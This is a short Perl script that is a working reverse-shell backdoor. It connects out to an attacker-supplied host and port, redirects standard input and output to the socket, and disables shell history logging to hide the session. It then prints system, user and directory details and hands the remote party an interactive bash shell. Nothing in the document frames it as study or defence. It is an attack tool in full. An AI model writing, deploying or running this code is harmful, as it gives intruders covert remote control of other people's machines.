#!/usr/bin/perl
use IO::Socket;
$Shell	= "/bin/bash";
$ARGC=@ARGV;
use Socket;
use FileHandle;
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die print "[-] Unable to Resolve Host\n";
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";
print "Connected!";
SOCKET->autoflush();
open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");
print "--== Connected Backdoor ==--  \n\n";
system("unset HISTFILE; unset SAVEHIST ;echo '[+] Systeminfo: '; uname -a;echo;echo '[+] Userinfo: '; id;echo;echo '[+] Directory: '; pwd;echo; echo '[+] Shell: ';$Shell");
close SOCKET;
